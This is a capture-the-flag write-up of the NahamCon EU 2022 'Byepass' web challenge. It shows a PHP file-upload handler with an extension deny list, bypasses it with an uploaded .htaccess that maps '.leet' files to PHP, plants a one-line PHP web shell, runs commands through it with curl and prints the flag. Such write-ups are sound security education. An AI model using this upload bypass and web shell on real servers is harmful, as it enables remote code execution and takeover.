# Byepass

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

- Challenge difficulty: Medium

## Background

Author: @JohnHammond#6971  
  
Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!  

**Retrieve the flag out of the root of the filesystem `/flag.txt`.**  

**Press the `Start` button on the top-right to begin this challenge.**

**Connect with:**  

- [http://challenge.nahamcon.com:30983](http://challenge.nahamcon.com:30983)

**Attachments:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# file byepass.7z 
byepass.7z: 7-zip archive data, version 0.4
```

## Find The Flag

**Let's extract all the files in side 7zip:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# 7z e byepass.7z
[...]

┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# ls -lah               
total 3.0M
drwxr-xr-x 6 root root 4.0K Dec 16 22:55 .
drwxr-xr-x 3 root root 4.0K Dec 16 22:54 ..
-rw-r--r-- 1 root root 535K Mar 23  2022 01.jpg
-rw-r--r-- 1 root root 247K Mar 23  2022 02.jpg
-rw-r--r-- 1 root root 523K Mar 23  2022 03.jpg
drwx------ 2 root root 4.0K Dec 10 15:47 assets
-rw-r--r-- 1 nam  nam  1.4M Dec 16 22:54 byepass.7z
drwx------ 2 root root 4.0K Mar 23  2022 css
-rw-r--r-- 1 root root  215 Dec 10 18:51 Dockerfile
drwx------ 2 root root 4.0K Mar 23  2022 img
-rw-r--r-- 1 root root 5.8K Dec 10 18:48 index.php
-rw-r--r-- 1 root root  70K Dec 10 17:28 php.ini
-rw-r--r-- 1 root root 5.2K Dec 10 18:02 save_memories.php
-rw-r--r-- 1 root root 206K Dec 10 16:06 styles.css
drwxr-xr-x 2 root root 4.0K Dec 10 16:14 www
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216225717.png)

**`/save_memories.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216225747.png)

Looks like we can upload a file to the server!

**Let's dig deeper into the source code:**
```php
<?php
error_reporting(E_ALL);
ini_set('display_errors',1);

$target_dir = "/var/www/html/uploads/";
$uploadOk = 1;

$ext_denylist = array(
    "php",
    "php2",
    "php3",
    "php4",
    "php5",
    "php6",
    "php7",
    "phps",
    "phps",
    "pht",
    "phtm",
    "phtml",
    "pgif",
    "shtml",
    "phar",
    "inc",
    "hphp",
    "ctp",
);

if(isset($_POST["submit"])) {    
    $target_file = basename($_FILES["fileToUpload"]["name"]);
    $filename = $_FILES["fileToUpload"]["name"];
    $uploadOk = 1;
    if ($filename== ""){
        echo("<br><br><br><br><h1>ERROR:</h1> No file was supplied.");
        $uploadOk = 0;
    }

    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if ( in_array($ext, $ext_denylist)) {
        echo('<br><br><br><br><h1>ERROR:</h1> Not a valid image to upload');
        $uploadOk = 0;
    }

    if ($_FILES["fileToUpload"]["size"] > 500000) {
      echo("<br><br><br><br><h1>ERROR:</h1> This file is too large for us to store!");
      $uploadOk = 0;
    }

    if ($uploadOk){

        $moved = move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
        if ($moved){
            echo("<br><br><br><br><h1>SUCCESS:</h1> Your memory has been saved, you can view your photographs here: <a href='$filename'>/uploads/$filename</a>.");
        } else {
            echo("<br><br><br><br><h1>ERROR:</h1> Sorry, there was an error uploading your file '$filename'.<br><br>");
            echo($_FILES['fileToUpload']['error']);
            var_dump($_FILES);
        }
    }
}

?>
[...HTML_Code...]
```

**Let's break it down!**

- After upload a file, it checks:
    - If it's empty, `uploadOk` set to `0`
	- If the extension is in the blacklist, `uploadOk` set to `0`
	- If the file size is greater than `500000`, `uploadOk` set to `0`
- Then, if `uploadOk` is `1`, do:
	- Move the uploaded file to the destination, which is `/var/www/html/uploads/<filename>`

**Armed with above information, we can try to bypass the blacklist extensions!**

**But first, let's upload a normal image file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216230726.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216230746.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216230811.png)

**Luckly, I've learned how to bypass extension blacklist in PortSwigger Lab! :D** 

> [PortSwigger Lab File Upload Vulnerabilities Writeup](https://siunam321.github.io/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-4/)

Now, many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.

In Apache servers, it will load a directory-specific configuration from a file called `.htaccess` if one is present.

So, **what if I upload a file called `.htaccess` to override the server configuration?**

Therefore, we can create **our own `.htaccess` with the following configuration:**

```
AddType application/x-httpd-php .leet
```

**By doing that, we can execute any PHP files that has `.leet` extension!**

**Let’s do that!**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# echo "AddType application/x-httpd-php .leet" > .htaccess
```

**Then, we'll need to create a simple PHP one liner web shell, with `leet` extension:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# echo '<?php system($_GET["cmd"]); ?>' > webshell.leet
```

**Time to upload them!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216232735.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216232742.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216232752.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216232758.png)

**Then, we should able to execute any command via visiting that web shell file!**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# curl http://challenge.nahamcon.com:31150/webshell.leet --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Boom! We have RCE(Remote Code Execution), let's `cat` the flag!**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Byepass]
└─# curl http://challenge.nahamcon.com:31150/webshell.leet --get --data-urlencode "cmd=cat /flag.txt"
flag{32697ad7acd2d4718758d9a5ee42965d}
```

- **Flag: `flag{32697ad7acd2d4718758d9a5ee42965d}`**

# Conclusion

What we've learned:

1. RCE(Remote Code Execution) via File Upload & Blacklisted Extensions Bypass